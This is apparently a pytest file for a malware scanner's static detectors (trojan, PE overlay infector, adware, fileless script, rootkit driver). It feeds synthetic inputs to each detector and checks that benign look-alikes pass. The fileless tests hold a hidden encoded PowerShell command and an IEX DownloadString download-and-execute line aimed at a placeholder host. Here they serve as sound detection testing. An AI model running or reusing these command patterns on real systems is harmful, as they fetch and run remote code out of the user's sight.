"""Per-category STATIC detector tests. Synthetic inputs only — no real malware
(the base hash/infector path is exercised with EICAR elsewhere). Each detector
is checked for both the catch AND the non-catch of a legit look-alike."""

import os
import struct

from scanner.detectors import Category, FileContext, Sensitivity
from scanner.detectors.infector import InfectorDetector, end_of_last_section
from scanner.detectors.pup import PupDetector
from scanner.detectors.rootkit import RootkitDriverDetector
from scanner.detectors.script import FilelessScriptDetector
from scanner.detectors.trojan import TrojanDetector


def _ctx(path, *, size=0, head=None, buf=None, digest=None, signed=False):
    name = os.path.basename(path)
    return FileContext(path=path, name=name, lower=name.lower(),
                       ext=os.path.splitext(name.lower())[1], size=size,
                       head=head, buf=buf, digest=digest,
                       is_signed=lambda: signed)


# ---- trojan ---------------------------------------------------------------
def test_trojan_flags_unsigned_system_name_out_of_place(tmp_path):
    det = TrojanDetector()
    p = str(tmp_path / "Downloads" / "svchost.exe")
    hits = det.check(_ctx(p, signed=False))
    assert len(hits) == 1
    assert hits[0].category == Category.TROJAN.value


def test_trojan_ignores_signed_system_binary(tmp_path):
    det = TrojanDetector()
    p = str(tmp_path / "svchost.exe")
    assert det.check(_ctx(p, signed=True)) == []


def test_trojan_flags_typosquat(tmp_path):
    det = TrojanDetector({"sensitivity": "medium"})
    assert det.check(_ctx(str(tmp_path / "svch0st.exe"), signed=False))
    assert det.check(_ctx(str(tmp_path / "scvhost.exe"), signed=False))


def test_trojan_low_sensitivity_skips_typosquat(tmp_path):
    det = TrojanDetector({"sensitivity": "low"})
    assert det.check(_ctx(str(tmp_path / "svch0st.exe"), signed=False)) == []


def test_trojan_leaves_normal_exe_alone(tmp_path):
    det = TrojanDetector()
    assert det.check(_ctx(str(tmp_path / "notepad.exe"), signed=False)) == []
    assert det.check(_ctx(str(tmp_path / "MyApp.exe"), signed=False)) == []


# ---- infector (PE overlay) -----------------------------------------------
def _minimal_pe(section_raw_end=0x400):
    """A parseable PE header whose single section's raw data ends at
    `section_raw_end`. Optional header size 0 to keep the layout trivial."""
    pe_off = 0x80
    sect = pe_off + 4 + 20                          # DOS+sig+COFF -> section table
    buf = bytearray(max(section_raw_end, sect + 40))
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, pe_off)
    buf[pe_off:pe_off + 4] = b"PE\x00\x00"
    coff = pe_off + 4
    struct.pack_into("<H", buf, coff + 2, 1)       # NumberOfSections = 1
    struct.pack_into("<H", buf, coff + 16, 0)      # SizeOfOptionalHeader = 0
    raw_size, raw_ptr = 0x200, section_raw_end - 0x200
    struct.pack_into("<I", buf, sect + 16, raw_size)
    struct.pack_into("<I", buf, sect + 20, raw_ptr)
    return bytes(buf)


def test_pe_parser_finds_section_end():
    assert end_of_last_section(_minimal_pe(0x400)) == 0x400
    assert end_of_last_section(b"not a pe") is None


def test_infector_flags_large_highentropy_overlay():
    det = InfectorDetector({"sensitivity": "low"})
    header = _minimal_pe(0x400)
    overlay = os.urandom(100 * 1024)               # high-entropy appended blob
    blob = header + overlay
    hits = det.check(_ctx("/x/host.exe", size=len(blob), head=blob[:262144],
                          buf=blob, signed=False))
    assert len(hits) == 1
    assert hits[0].category == Category.VIRUS.value


def test_infector_ignores_signed_overlay():
    det = InfectorDetector({"sensitivity": "low"})
    blob = _minimal_pe(0x400) + os.urandom(100 * 1024)
    assert det.check(_ctx("/x/setup.exe", size=len(blob), buf=blob,
                          signed=True)) == []


def test_infector_ignores_normal_pe_without_overlay():
    det = InfectorDetector({"sensitivity": "high"})
    blob = _minimal_pe(0x400)                        # file ends at section end
    assert det.check(_ctx("/x/app.exe", size=len(blob), buf=blob,
                          signed=False)) == []


# ---- PUP / adware ---------------------------------------------------------
def test_pup_flags_known_adware_installer(tmp_path):
    det = PupDetector()
    hits = det.check(_ctx(str(tmp_path / "SearchProtect_setup.exe")))
    assert len(hits) == 1
    assert hits[0].category == Category.ADWARE.value
    assert hits[0].severity.value == "suspicious"      # low aggressiveness


def test_pup_ignores_plain_installer(tmp_path):
    det = PupDetector()
    assert det.check(_ctx(str(tmp_path / "setup.exe"))) == []
    assert det.check(_ctx(str(tmp_path / "MyApp-Installer.exe"))) == []


# ---- fileless / LOTL script ----------------------------------------------
def test_fileless_flags_encoded_powershell(tmp_path):
    det = FilelessScriptDetector()
    body = b"powershell -nop -w hidden -enc " + b"QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA=="
    hits = det.check(_ctx(str(tmp_path / "drop.ps1"), buf=body))
    assert len(hits) == 1 and hits[0].category == Category.FILELESS.value


def test_fileless_flags_download_execute(tmp_path):
    det = FilelessScriptDetector()
    body = b'IEX (New-Object Net.WebClient).DownloadString("http://x/y")'
    assert det.check(_ctx(str(tmp_path / "a.ps1"), buf=body))


def test_fileless_ignores_benign_script(tmp_path):
    det = FilelessScriptDetector()
    body = b'Write-Host "hello"\nGet-ChildItem C:\\Users\n'
    assert det.check(_ctx(str(tmp_path / "ok.ps1"), buf=body)) == []


# ---- rootkit (at-rest) ----------------------------------------------------
def test_rootkit_flags_unsigned_driver_out_of_store(tmp_path):
    det = RootkitDriverDetector()
    hits = det.check(_ctx(str(tmp_path / "Downloads" / "evil.sys"), signed=False))
    assert len(hits) == 1 and hits[0].category == Category.ROOTKIT.value


def test_rootkit_ignores_signed_driver(tmp_path):
    det = RootkitDriverDetector()
    assert det.check(_ctx(str(tmp_path / "vendor.sys"), signed=True)) == []
